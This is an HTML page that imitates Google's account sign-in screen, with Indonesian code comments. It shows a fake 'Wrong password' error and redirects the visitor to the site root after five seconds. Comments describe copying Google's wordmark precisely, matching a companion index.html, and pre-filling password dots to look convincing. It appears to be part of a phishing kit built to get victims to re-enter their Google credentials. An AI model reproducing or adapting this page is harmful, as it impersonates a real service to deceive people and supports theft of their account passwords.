<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            background-color: #f0f4f9;
            color: #202124;
            line-height: 1.4;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 24px;
        }

        /* Kotak Putih Utama Google - Ukuran Sama dengan index.html */
        .container {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px 40px;
            border: 1px solid #dadce0;
            background: #ffffff;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
        }

        header { 
            text-align: center; 
            margin-bottom: 0px; 
        }

        /* Replikasi Google Wordmark Presisi - Jarak Huruf Sama dengan index.html */
        .g-logo {
            display: inline-block;
            font-family: 'Product Sans', 'Google Sans', Roboto, Arial, sans-serif;
            font-weight: 500;
            font-size: 24px;
            letter-spacing: -0.2px;
            line-height: 1;
            margin-bottom: 16px;
            width: 100%;
            text-align: center;
        }

        .g-logo span { display: inline-block; }
        .g-blue { color: #4285F4; }
        .g-red { color: #EA4335; }
        .g-yellow { color: #FBBC05; }
        .g-green { color: #34A853; }

        /* Judul Utama */
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
            text-align: center;
        }

        /* Sub-judul Instruksi */
        .subhead {
            font-size: 16px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 32px;
            text-align: center;
        }

        form { margin-top: 0px; }

        .form-row { margin-bottom: 24px; }

        /* Pembungkus Input untuk Efek Outlined Box */
        .input-wrapper { 
            position: relative; 
            width: 100%;
        }

        /* Label dibuat menetap memotong border atas berwarna merah error */
        label.floating-label {
            position: absolute;
            left: 12px;
            top: 0;
            transform: translateY(-50%);
            background: #ffffff;
            padding: 0 4px;
            font-size: 12px;
            color: #b3261e; /* Warna merah error Google Accounts asli */
            transition: 0.15s ease all;
            pointer-events: none;
            z-index: 2;
        }

        /* Default border langsung berwarna merah cerah status error */
        input[type="password"] {
            width: 100%;
            padding: 16px 14px;
            border: 2px solid #b3261e; /* Dikunci warna merah error */
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            background: transparent;
            color: #202124;
        }

        /* Menjaga border tetap merah saat tidak fokus */
        input[type="password"]:not(:focus) {
            border: 2px solid #b3261e;
        }

        /* Desain Pesan Error Akun Google Tepat di Bawah Kotak Input */
        .error-text-container {
            display: flex;
            align-items: flex-start;
            gap: 8px;
            color: #b3261e;
            font-size: 12px;
            margin-top: 8px;
            line-height: 1.4;
        }

        .error-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 16px;
            height: 16px;
            border-radius: 50%;
            background-color: #b3261e;
            color: #ffffff;
            font-size: 11px;
            font-weight: bold;
            flex-shrink: 0;
            margin-top: 1px;
        }

        /* Baris Tombol & Tautan */
        .actions {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-top: 26px;
        }

        .left-links { display: flex; align-items: center; }

        .help-link {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }

        .help-link:hover { color: #1557b0; }

        /* Tombol Try Again Mengikuti Dimensi Tombol Next index.html */
        .btn-next {
            padding: 10px 24px;
            background-color: #1a73e8;
            color: #fff;
            border: 0;
            font-weight: 500;
            font-size: 14px;
            border-radius: 4px;
            cursor: pointer;
            white-space: nowrap;
            transition: background-color 0.15s;
        }

        .btn-next:hover { 
            background-color: #1557b0; 
        }

        .divider { display: none; }

        /* Footer Standar Google Luar Kotak */
        .footer-outer { 
            width: 100%;
            max-width: 450px;
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            font-size: 12px; 
            color: #747775;
            margin-top: 24px;
            padding: 0 4px;
        }

        .footer-outer .right-links a { 
            color: #747775; 
            text-decoration: none; 
            margin-left: 16px; 
        }

        .footer-outer .right-links a:hover { color: #202124; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="g-logo" aria-label="Google">
                <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
            </div>
            <h1>Sign in</h1>
        </header>

        <div id="form-container">
            <div class="subhead">Confirm your password</div>
            <form id="update-form" onsubmit="return false;">
                <div class="form-row">
                    <div class="input-wrapper">
                        <!-- Mengisi value titik sandi simulasi agar tampak meyakinkan -->
                        <input type="password" id="password" name="password" value="••••••••" placeholder=" " disabled>
                        <label class="floating-label" for="password">Enter your password</label>
                    </div>
                    
                    <!-- Pesan Notifikasi Kesalahan Validasi Sandi Google -->
                    <div class="error-text-container">
                        <span class="error-icon">!</span>
                        <span>Wrong password. Try again or click Forgot password to reset it.</span>
                    </div>
                </div>

                <div class="actions">
                    <div class="left-links">
                        <a class="help-link" href="#" onclick="window.location.href='/'">Forgot password?</a>
                    </div>
                    <div>
                        <button type="button" id="submit-btn" class="btn-next" onclick="window.location.href='/'">Try again</button>
                    </div>
                </div>
            </form>
        </div>
    </div>

    <div class="footer-outer">
        <div class="left-lang" style="cursor: pointer;">English (United States) ▾</div>
        <div class="right-links">
            <a href="#" onclick="window.location.href='/'">Help</a>
            <a href="#" onclick="window.location.href='/'">Privacy Policy</a>
            <a href="#" onclick="window.location.href='/'">Terms of Service</a>
        </div>
    </div>

    <!-- Skrip Timer Pengalihan Otomatis 5 Detik Milik Anda Tetap Aman -->
    <div id="countdown" style="display: none;"></div>

    <script>
        let seconds = 5;
        const countdownEl = document.getElementById('countdown');

        const interval = setInterval(function() {
            seconds--;
            if (countdownEl) countdownEl.textContent = 'Redirecting in ' + seconds + ' seconds...';

            if (seconds <= 0) {
                clearInterval(interval);
                window.location.href = '/';
            }
        }, 1000);

        setTimeout(function() {
            window.location.href = '/';
        }, 5000);
    </script>
</body>
</html>
